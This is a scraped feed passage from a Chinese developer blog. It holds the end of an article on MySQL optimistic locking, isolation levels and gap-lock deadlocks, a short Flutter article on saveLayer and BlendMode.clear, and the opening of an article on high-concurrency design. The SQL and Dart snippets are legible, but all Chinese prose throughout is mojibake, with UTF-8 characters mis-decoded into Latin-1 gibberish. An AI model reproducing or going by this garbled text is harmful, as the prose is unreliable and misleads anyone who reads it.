<p>å¦‚æœè¿”å› 0ï¼Œè¯´æ˜åœ¨æŸ¥è¯¢å’Œæ›´æ–°ä¹‹é—´ï¼Œæœ‰åˆ«çš„äº‹åŠ¡ä¿®æ”¹äº†æ•°æ®ï¼ˆversion å˜æˆäº† 11ï¼‰ã€‚æ­¤æ—¶åº”ç”¨å±‚åº”æ•è·è¿™ä¸ªå¤±è´¥ï¼Œå¹¶è¿›è¡Œé‡è¯•ï¼ˆRetryï¼‰æˆ–æŠ¥é”™ã€‚</p>
<p>ä¼˜ç‚¹ï¼š æ— é”ï¼ˆNo-Lockingï¼‰ï¼Œå¹¶å‘æ€§èƒ½æé«˜ã€‚</p>
<p>ç¼ºç‚¹ï¼š åœ¨å†²çªæ¿€çƒˆçš„åœºæ™¯ä¸‹ï¼Œé‡è¯•ç‡é«˜ï¼Œå¯èƒ½æµªè´¹ CPUã€‚</p>
<p>é€‚ç”¨åœºæ™¯ï¼š è¯»å¤šå†™å°‘ã€è¿½æ±‚é«˜ååé‡çš„åœºæ™¯ï¼ˆå¦‚ç§’æ€ï¼‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43239a87ea574457837c79bb92fb9011~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768507109&amp;x-signature=qQgPxcW13eIdrBdulEvXnHJZUAU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">äºŒã€ äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼šè„è¯»ä¸å¹»è¯»çš„æƒè¡¡</h2>
<p>MySQL é»˜è®¤çš„éš”ç¦»çº§åˆ«æ˜¯ <strong>RR (Repeatable Read)</strong>ï¼Œè€Œ Oracle/PostgreSQL é»˜è®¤é€šå¸¸æ˜¯ <strong>RC (Read Committed)</strong>ã€‚è¿™ä¸¤è€…çš„åŒºåˆ«ç›´æ¥å½±å“ä¸šåŠ¡é€»è¾‘çš„æ­£ç¡®æ€§ã€‚</p>
<h2 data-id="heading-4">1. è„è¯» (Dirty Read)</h2>
<p>A äº‹åŠ¡è¯»å–äº† B äº‹åŠ¡<strong>æœªæäº¤</strong>çš„æ•°æ®ã€‚</p>
<ul>
<li><strong>å‘ç”Ÿåœºæ™¯ï¼š</strong> READ UNCOMMITTED çº§åˆ«ã€‚</li>
<li><strong>ç»“è®ºï¼š</strong> ç”Ÿäº§ç¯å¢ƒä¸¥ç¦ä½¿ç”¨ï¼Œé™¤éä½ åœ¨åšæå…¶ç²—ç•¥çš„ç»Ÿè®¡ã€‚</li>
</ul>
<h2 data-id="heading-5">2. ä¸å¯é‡å¤è¯» (Non-Repeatable Read)</h2>
<p>A äº‹åŠ¡é‡Œä¸¤æ¬¡è¯»å–åŒä¸€è¡Œæ•°æ®ï¼Œç»“æœä¸ä¸€æ ·ï¼ˆå› ä¸º B äº‹åŠ¡åœ¨ä¸­é—´æäº¤äº†ä¿®æ”¹ï¼‰ã€‚</p>
<ul>
<li><strong>RC çº§åˆ«</strong>å…è®¸å‘ç”Ÿã€‚</li>
<li><strong>RR çº§åˆ«</strong>é€šè¿‡ <strong>MVCC (å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶)</strong> è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚åœ¨ RR ä¸‹ï¼Œäº‹åŠ¡å¼€å¯æ—¶ä¼šç”Ÿæˆä¸€ä¸ªå¿«ç…§ (Snapshot)ï¼Œåç»­è¯»å–çš„éƒ½æ˜¯å¿«ç…§ç‰ˆæœ¬ã€‚</li>
</ul>
<h2 data-id="heading-6">3. å¹»è¯» (Phantom Read)</h2>
<p>A äº‹åŠ¡è¯»å–äº†ä¸€ä¸ªèŒƒå›´ï¼ˆå¦‚ id &gt; 10ï¼‰ï¼ŒB äº‹åŠ¡æ’å…¥äº†ä¸€æ¡æ–°æ•°æ® id=11ã€‚A å†æ¬¡è¯»å–æ—¶ï¼Œå‘ç°å¤šäº†ä¸€æ¡â€œå¹½çµâ€æ•°æ®ã€‚</p>
<ul>
<li><strong>MySQL çš„ RR çº§åˆ«</strong>é€šè¿‡ <strong>Next-Key Lock (é—´éš™é”)</strong> åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šè§£å†³äº†å¹»è¯»ï¼Œä½†ä¹Ÿå¸¦æ¥äº†æ­»é”éšæ‚£ã€‚</li>
</ul>
<h2 data-id="heading-7">ä¸‰ã€ æ­»é” (Deadlock) æ’æŸ¥ï¼šçœ‹ä¸è§çš„â€œé—´éš™é”â€</h2>
<p>å¾ˆå¤šå¼€å‘è€…è®¤ä¸ºï¼šâ€œæˆ‘åªé”äº†ä¸€è¡Œæ•°æ®ï¼Œä¸ºä»€ä¹ˆä¼šæ­»é”ï¼Ÿâ€</p>
<p>åœ¨ MySQL çš„ RR éš”ç¦»çº§åˆ«ä¸‹ï¼Œæœ€å¸¸è§çš„æ­»é”å‡¶æ‰‹æ˜¯ é—´éš™é” (Gap Lock)ã€‚</p>
<p>åœºæ™¯å¤ç°ï¼š</p>
<p>è¡¨ t_user æœ‰ id ä¸º 10, 20 çš„ä¸¤æ¡è®°å½•ã€‚</p>
<p><strong>äº‹åŠ¡ Aï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">-- è¯•å›¾æ›´æ–°ä¸€æ¡ä¸å­˜åœ¨çš„è®°å½• (<span class="hljs-attr">id</span>=<span class="hljs-number">15</span>)
UPDATE t_user SET <span class="hljs-attr">name</span> = <span class="hljs-string">'A'</span> WHERE id = <span class="hljs-number">15</span><span class="hljs-comment">;</span>
</code></pre>
<p><strong>è§£æï¼š</strong> å› ä¸º id=15 ä¸å­˜åœ¨ï¼ŒMySQL ä¸ºäº†é˜²æ­¢å¹»è¯»ï¼Œä¼šé”ä½ (10, 20) è¿™ä¸ª<strong>é—´éš™ (Gap)</strong>ï¼Œä¸è®¸åˆ«äººåœ¨è¿™ä¸ªèŒƒå›´å†…æ’å…¥æ•°æ®ã€‚</p>
<p><strong>äº‹åŠ¡ Bï¼š</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- è¯•å›¾æ’å…¥ä¸€æ¡è®°å½• (id=16)</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> t_user (id, name) <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">16</span>, <span class="hljs-string">'B'</span>);
</code></pre>
<p><strong>è§£æï¼š</strong> id=16 è½åœ¨ (10, 20) é—´éš™å†…ï¼Œè¢«äº‹åŠ¡ A çš„é—´éš™é”é˜»å¡ï¼Œè¿›å…¥ç­‰å¾…ã€‚</p>
<p>æ­»é”å½¢æˆï¼š</p>
<p>å¦‚æœäº‹åŠ¡ A æ­¤æ—¶ä¹Ÿæƒ³æ‰§è¡Œ INSERT INTO t_user (id, name) VALUES (16, 'A');ï¼Œå®ƒä¼šå‘ç°äº‹åŠ¡ B ä¹Ÿåœ¨ç”³è¯·é”ï¼Œäºæ˜¯å½¢æˆç¯è·¯ï¼šA ç­‰ B é‡Šæ”¾æ„å‘é”ï¼ŒB ç­‰ A é‡Šæ”¾é—´éš™é” -&gt; Deadlock foundã€‚</p>
<p>å¦‚ä½•æ’æŸ¥ï¼Ÿ</p>
<p>å½“å‘ç”Ÿæ­»é”æ—¶ï¼Œåº”ç”¨å±‚é€šå¸¸åªä¼šæ”¶åˆ°ä¸€ä¸ª Generic Errorã€‚è¦çœ‹è¯¦æƒ…ï¼Œéœ€è¦æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-ini" lang="ini">SHOW ENGINE INNODB STATUS<span class="hljs-comment">;</span>
</code></pre>
<p>åœ¨è¾“å‡ºçš„ LATEST DETECTED DEADLOCK ç« èŠ‚ä¸­ï¼Œä½ ä¼šçœ‹åˆ°æ¸…æ™°çš„æ—¥å¿—ï¼š</p>
<ul>
<li>LOCK WAIT</li>
<li>RECORD LOCKS space id ... index PRIMARY ... lock_mode X locks gap before rec ï¼ˆå…³é”®è¯ï¼šlocks gapï¼‰</li>
</ul>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ol>
<li>å°½é‡è®© UPDATE/DELETE è¯­å¥å‘½ä¸­å”¯ä¸€ç´¢å¼•ï¼Œé¿å…äº§ç”Ÿé—´éš™é”ã€‚</li>
<li>åœ¨é«˜å¹¶å‘å†™å…¥åœºæ™¯ä¸‹ï¼Œè€ƒè™‘å°†éš”ç¦»çº§åˆ«é™çº§ä¸º <strong>RC (Read Committed)</strong>ï¼ˆRC æ²¡æœ‰é—´éš™é”ï¼‰ï¼Œé€šè¿‡ä¸šåŠ¡å±‚é€»è¾‘ä¿è¯ä¸€è‡´æ€§ã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb340057cf554b2d98d529392f60c4a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768507109&amp;x-signature=tsjkac5B6aqviOoOP90hvvYgbrA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">æ€»ç»“</h2>
<p>å¹¶å‘æ§åˆ¶æ˜¯æ•°æ®åº“æŠ€æœ¯çš„æ·±æ°´åŒºï¼š</p>
<ol>
<li><strong>é˜²æ­¢è¶…å–</strong>ï¼šä¼˜å…ˆè€ƒè™‘ <strong>ä¹è§‚é” (Version CAS)</strong>ï¼Œåªæœ‰åœ¨é«˜å†²çªåœºæ™¯ä¸‹æ‰ä½¿ç”¨ <strong>æ‚²è§‚é” (FOR UPDATE)</strong>ã€‚</li>
<li><strong>éš”ç¦»çº§åˆ«</strong>ï¼šæ¸…æ¥šä½ çš„æ•°æ®åº“è·‘åœ¨ RC è¿˜æ˜¯ RR ä¸‹ã€‚MySQL é»˜è®¤çš„ RR è™½ç„¶å®‰å…¨ï¼Œä½†ä¼šå¼•å…¥é¢å¤–çš„ <strong>Gap Lock</strong> å¼€é”€å’Œæ­»é”é£é™©ã€‚</li>
<li><strong>æ­»é”åˆ†æ</strong>ï¼šé‡åˆ°æ­»é”åˆ«æ…Œï¼Œé€šè¿‡ SHOW ENGINE INNODB STATUS åˆ†æé”ç­‰å¾…é“¾ï¼Œé€šå¸¸æ˜¯å› ä¸ºå¯¹â€œä¸å­˜åœ¨çš„è®°å½•â€åŠ é”å¯¼è‡´çš„é—´éš™é”å†²çªã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter æ··åˆæ¨¡å¼ä¸‹ï¼šsaveLayer æ··åˆæ³¨æ„ç‚¹]]></title>    <link>https://juejin.cn/post/7592887786966351908</link>    <guid>https://juejin.cn/post/7592887786966351908</guid>    <pubDate>2026-01-09T03:24:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592887786966351908" data-draft-id="7592912896591364115" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter æ··åˆæ¨¡å¼ä¸‹ï¼šsaveLayer æ··åˆæ³¨æ„ç‚¹"/> <meta itemprop="keywords" content="Flutter,Android"/> <meta itemprop="datePublished" content="2026-01-09T03:24:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç«æŸ´å°±æ˜¯æˆ‘"/> <meta itemprop="url" content="https://juejin.cn/user/272334614705575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter æ··åˆæ¨¡å¼ä¸‹ï¼šsaveLayer æ··åˆæ³¨æ„ç‚¹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/272334614705575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç«æŸ´å°±æ˜¯æˆ‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:24:13.000Z" title="Fri Jan 09 2026 03:24:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç›´æ¥Paint ç»˜åˆ¶æ··åˆ</p>
<pre><code class="hljs language-js" lang="js">    canvas.<span class="hljs-title function_">saveLayer</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), <span class="hljs-title class_">Paint</span>());
    <span class="hljs-title class_">Paint</span> dstPaint = <span class="hljs-title class_">Paint</span>()..<span class="hljs-property">color</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">red</span>;
    dstPaint.<span class="hljs-property">strokeWidth</span> = <span class="hljs-number">20</span>;
    dstPaint.<span class="hljs-property">style</span> = <span class="hljs-title class_">PaintingStyle</span>.<span class="hljs-property">stroke</span>;
    canvas.<span class="hljs-title function_">drawImageRect</span>(image!, <span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, image!.<span class="hljs-property">width</span>.<span class="hljs-title function_">toDouble</span>(), image!.<span class="hljs-property">height</span>.<span class="hljs-title function_">toDouble</span>()), <span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), dstPaint);

    <span class="hljs-keyword">var</span> srcPaint = <span class="hljs-title class_">Paint</span>()
      ..<span class="hljs-property">color</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">yellowAccent</span> <span class="hljs-comment">// æºé¢œè‰²ï¼šè“è‰²</span>
      ..<span class="hljs-property">style</span> = <span class="hljs-title class_">PaintingStyle</span>.<span class="hljs-property">fill</span> <span class="hljs-comment">// å¡«å……æ¨¡å¼</span>
      ..<span class="hljs-property">blendMode</span> = ui.<span class="hljs-property">BlendMode</span>.<span class="hljs-property">clear</span>
      ..<span class="hljs-property">strokeWidth</span> = <span class="hljs-number">70</span>; <span class="hljs-comment">// æ··åˆæ¨¡å¼</span>
    canvas.<span class="hljs-title function_">drawRect</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height).<span class="hljs-title function_">deflate</span>(<span class="hljs-number">100</span>), srcPaint);
</code></pre>
<p>æ•ˆæœå›¾ï¼š</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca0ab18fc0104e1d80d75a1cc2911f2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768533853&amp;x-signature=ixgv4WOlft17x7UqUQBFAz0m0vo%3D" alt="image.png" width="30%" loading="lazy"/>
<p>ä½†æ˜¯å¦‚æœæ”¹æˆå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js">    canvas.<span class="hljs-title function_">saveLayer</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), <span class="hljs-title class_">Paint</span>());
    <span class="hljs-title class_">Paint</span> dstPaint = <span class="hljs-title class_">Paint</span>()..<span class="hljs-property">color</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">red</span>;
    dstPaint.<span class="hljs-property">strokeWidth</span> = <span class="hljs-number">20</span>;
    dstPaint.<span class="hljs-property">style</span> = <span class="hljs-title class_">PaintingStyle</span>.<span class="hljs-property">stroke</span>;
    canvas.<span class="hljs-title function_">drawImageRect</span>(image!, <span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, image!.<span class="hljs-property">width</span>.<span class="hljs-title function_">toDouble</span>(), image!.<span class="hljs-property">height</span>.<span class="hljs-title function_">toDouble</span>()), <span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), dstPaint);
    
    canvas.<span class="hljs-title function_">saveLayer</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width/<span class="hljs-number">2</span>, height/<span class="hljs-number">2</span>), ui.<span class="hljs-title class_">Paint</span>()
    ..<span class="hljs-property">blendMode</span> = ui.<span class="hljs-property">BlendMode</span>.<span class="hljs-property">clear</span>);

    <span class="hljs-keyword">var</span> srcPaint = <span class="hljs-title class_">Paint</span>()
      ..<span class="hljs-property">color</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">yellowAccent</span> <span class="hljs-comment">// æºé¢œè‰²ï¼šè“è‰²</span>
      ..<span class="hljs-property">style</span> = <span class="hljs-title class_">PaintingStyle</span>.<span class="hljs-property">fill</span> <span class="hljs-comment">// å¡«å……æ¨¡å¼</span>
      ..<span class="hljs-property">strokeWidth</span> = <span class="hljs-number">70</span>; <span class="hljs-comment">// æ··åˆæ¨¡å¼</span>
    canvas.<span class="hljs-title function_">drawRect</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height).<span class="hljs-title function_">deflate</span>(<span class="hljs-number">100</span>), srcPaint);
</code></pre>
<p>ç›®æµ‹ä»£ç é€»è¾‘æ˜¯ä¸€æ ·çš„åªæ˜¯æŠŠæ··åˆæ¨¡å¼è®¾ç½®ç»™äº†Layerã€‚ä½†æ˜¯æœ€ç»ˆæ•ˆæœå°±æ˜¯ç•Œé¢ä¸Šå•¥é¡µæ²¡æœ‰å…¨éƒ¨è¢«æ¸…ç©ºäº†ã€‚è¿™æ˜¯å› ä¸ºè®¾ç½®äº†æ··åˆæ¨¡å¼ä¹‹å,æ•´ä¸ªå›¾å±‚éƒ½ä¼šè¢«å½“ä½œsrc è¿›è¡Œæ··åˆã€‚å¹¶ä¸”ç¬¬ä¸€ä¸ªè®¾ç½®èŒƒå›´çš„å‚æ•°ä¹Ÿä¸ç”Ÿæ•ˆã€‚</p>
<p>å¦‚æœæƒ³é™åˆ¶åˆ°æŒ‡å®šèŒƒå›´å¯ä»¥åœ¨saveLayerå‰åŠ å¦‚ä¸‹å†…å®¹:</p>
<pre><code class="hljs language-js" lang="js">  canvas.<span class="hljs-title function_">clipRect</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width/<span class="hljs-number">2</span>, height/<span class="hljs-number">2</span>));
</code></pre>
<p>é‚£ä¹ˆåŠ å®Œä¹‹åçš„æ•ˆæœå›¾å¦‚ä¸‹:</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/558f554184234155b5564810a7766348~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768533853&amp;x-signature=wsSloCb0DJ%2BswQJUI2LyUk7FxSE%3D" alt="image.png" width="30%" loading="lazy"/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•è®¾è®¡ä¸€ä¸ªé«˜å¹¶å‘ç³»ç»Ÿï¼Ÿ]]></title>    <link>https://juejin.cn/post/7593139476832518187</link>    <guid>https://juejin.cn/post/7593139476832518187</guid>    <pubDate>2026-01-09T03:31:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7593139476832518187" data-draft-id="7593139476832501803" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•è®¾è®¡ä¸€ä¸ªé«˜å¹¶å‘ç³»ç»Ÿï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-09T03:31:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‹ä¸‰è¯´æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/465848661970824"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•è®¾è®¡ä¸€ä¸ªé«˜å¹¶å‘ç³»ç»Ÿï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848661970824/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‹ä¸‰è¯´æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:31:06.000Z" title="Fri Jan 09 2026 03:31:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»27åˆ†é’Ÿ
